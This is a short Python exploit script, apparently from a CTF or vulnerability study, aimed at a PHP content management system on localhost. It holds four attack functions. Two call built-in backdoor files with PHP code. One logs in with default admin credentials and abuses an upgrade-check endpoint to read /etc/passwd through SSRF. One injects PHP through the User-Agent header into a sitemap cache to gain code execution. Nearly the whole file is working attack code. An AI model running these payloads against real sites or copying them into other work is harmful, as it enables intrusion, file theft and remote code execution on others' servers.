import requests
import re

def zi_dai_hou_men_1():
	url = "http://127.0.0.1:8080/core/weixin/Wx.php"
	data = {'a':'phpinfo();'}
	print(requests.post(url,data).text)
def zi_dai_hou_men_2():
	url = "http://127.0.0.1:8080/core/conn.php"
	data = {'a':'phpinfo();'}
	print(requests.post(url,data).text)
def ssrf():
	token_url = "http://127.0.0.1:8080/admin.php?p=/Index/index"
	s = requests.session()
	token = re.findall(r'id="formcheck" value="(.+?)"',s.get(token_url).text)[0]
	login_data = {
	'username':'admin',
	'password':'admin',
	'formcheck':token
	}
	login_url = "http://127.0.0.1:8080/admin.php?p=/Index/login"
	s.post(login_url,login_data).text
	ssrf_url = "http://127.0.0.1:8080/admin.php?p=/Upgrade/check"
	data = {
	'update_url':'file:///etc/passwd'
	}
	print(s.post(ssrf_url,data).text)
def cache_get_shell():
	url = "http://127.0.0.1:8080/index.php?p=sitemap"
	headers = {
	'User-Agent':"';phpinfo();//"
	}
	print(requests.get(url=url,headers=headers).text)
#zi_dai_hou_men_1()
#zi_dai_hou_men_2()
#ssrf()
#cache_get_shell()
